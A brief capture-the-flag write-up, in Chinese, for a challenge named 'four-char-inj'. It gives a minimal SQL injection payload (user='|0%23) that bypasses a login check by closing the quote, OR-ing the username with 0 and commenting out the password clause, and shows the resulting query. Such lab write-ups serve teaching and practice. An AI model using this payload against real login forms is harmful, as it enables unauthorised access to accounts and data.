# four-char-inj
解題邏輯：用超短payload (>4 char) SQL injection
payload =  `user='|0%23&pass=`
先用 `'` 閉合前面，再將 user 字串比較為 0 ，並用註解符 `#` url encode過
> SELECT * FROM user WHERE username=''|0%23<del>' and password='" . $pass . "'</del>
